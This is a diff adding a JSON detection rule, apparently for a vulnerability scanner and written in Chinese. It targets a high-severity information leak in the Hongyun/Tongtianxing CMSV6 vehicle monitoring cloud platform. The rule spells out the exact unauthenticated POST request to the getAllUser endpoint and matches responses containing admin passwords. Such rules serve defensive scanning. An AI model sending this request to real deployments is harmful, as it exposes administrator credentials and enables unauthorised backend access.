@@ -1,0 +1,24 @@
+{
+    "vul_name": "鸿运(通天星CMSV6车载)主动安全监控云平台存在敏感信息泄露漏洞",
+    "level": "高危",
+    "description": "鸿运主动安全监控云平台实现对计算资源、存储资源、网络资源、云应用服务进行7*24小时全时区、多地域、全方位、立体式、智能化的IT运维监控，保障IT系统安全、稳定、可靠运行。鸿运(通天星CMSV6车载)主动安全监控云平台存在敏感信息泄露漏洞，可通过信息登陆后台",
+    "product": "鸿运(通天星CMSV6车载)主动安全监控云平台",
+    "version": "鸿运(通天星CMSV6车载)主动安全监控云平台",
+    "cve": "无",
+    "reference": "https://mp.weixin.qq.com/s/6bCT1NqaeiyxzNyNrSEs7w",
+    "fixing": "联系厂商更新补丁",
+    "rule": {
+        "path": "/808gps/StandardLoginAction_getAllUser.action",
+        "method": "POST",
+        "headers": "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: close\r\nContent-Length: 9\r\nContent-Type: application/x-www-form-urlencoded",
+        "body": "json=null",
+        "status_code": "200",
+        "keywords": "admin;password",
+        "res_time": ""
+    },
+    "operator": {
+        "author": "浪飒",
+        "email": "langsa-hy@qq.com",
+        "github": "https://github.com/langsasec"
+    }
+}
